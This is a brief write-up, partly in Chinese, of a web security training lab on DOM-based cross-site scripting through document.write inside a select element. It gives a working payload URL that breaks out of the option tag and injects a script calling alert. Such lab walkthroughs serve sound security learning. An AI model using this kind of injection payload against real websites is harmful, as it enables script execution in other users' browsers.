# Lab: DOM XSS in document.write sink using source location.search inside a select element

This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.

## Cross Site Scripting
* 這一題說在 stock 有弱點，看一下 js 可以發現有一個 [URLSearchParams](https://pjchender.blogspot.com/2018/08/js-javascript-url-parameters.html) 在 payload 這個 function 裡面
```
payload = https://ac241f581ecbca5dc0fe26af001c0043.web-security-academy.net/product?productId=1&storeId=123%3C/option%3E%3Cscript%3Ealert(1)%3C/script%3E
```